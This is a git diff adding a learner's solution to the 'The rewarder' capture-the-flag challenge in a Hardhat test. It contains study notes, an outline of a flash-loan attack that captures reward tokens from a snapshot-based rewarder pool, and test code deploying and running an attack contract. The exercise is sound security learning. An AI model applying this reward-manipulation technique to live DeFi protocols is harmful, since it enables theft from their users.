@@ -66,6 +66,55 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        /** What idk from this Challenges
+         * What is the new keyword for?
+         *Contract dont' have private keys so they cant sign transaction
+         State visibility function like external and internal public private
+
+          External functions are part of the contract interface, which means they can be called from other contracts and via transactions. 
+          An external function f cannot be called internally (i.e. f() does not work, but this.f() works). 
+          External functions are sometimes more efficient when they receive large arrays of data.
+
+          Another big problem is the conversion of tokens. The no of decimals 
+
+          another problem for me is understanding the expect and actual values from hardhat testing
+          I really need to understand interfaces and the difference between using single snapshot in time instead of continuous/aggregated data points
+         */
+
+        /**
+         * Methodology of solving the challenges
+         * Essentially can use the flashloan to deposit and get the reward token 
+         * then withdraw to get back our DVT 
+         * then donate back the DVT to the liquity pool 
+         * 
+         * But the flaw in this Rewarder Pool is that i get to keep the rewards token even after i withdraw, as the accounting token is the only one that gets burnt
+         * 
+         * 
+         * 1. We create a attacking contract that has the function selector receiveFlashLoan(uint256)
+         * 
+         * Errors i got:
+         * Only 1 round should have taken place
+         */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const AttackRewarderPool = await ethers.getContractFactory("AttackRewarderPool",attacker);
+        const AttackRewarderPoolContract = await AttackRewarderPool.deploy(this.rewarderPool.address,this.liquidityToken.address,this.flashLoanPool.address, this.rewardToken.address);
+
+
+        //They still got rewards here, gotta use math
+        //await AttackRewarderPoolContract.executeFlashLoan(ethers.utils.parseEther('400'))
+    
+        // so existing deposit is 400, i need to mkae it 0.01
+        //rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
+        // so we gotta sub reward = 0.01, amountDeposited by the eachUser is 100 and find the total deposits - 400;
+        // We get 999600
+        // so tokens in lender pool - 400
+        //await AttackRewarderPoolContract.executeFlashLoan(TOKENS_IN_LENDER_POOL.sub(ethers.utils.parseEther('500')))
+        await AttackRewarderPoolContract.executeFlashLoan(TOKENS_IN_LENDER_POOL)
+        //await AttackRewarderPoolContract.executeFlashLoan(ethers.utils.parseEther("400"))
+
+        //const useFlashLoanContract = await this.flashLoanPool.connect(AttackRewarderPoolContract);
+
     });
 
     after(async function () {
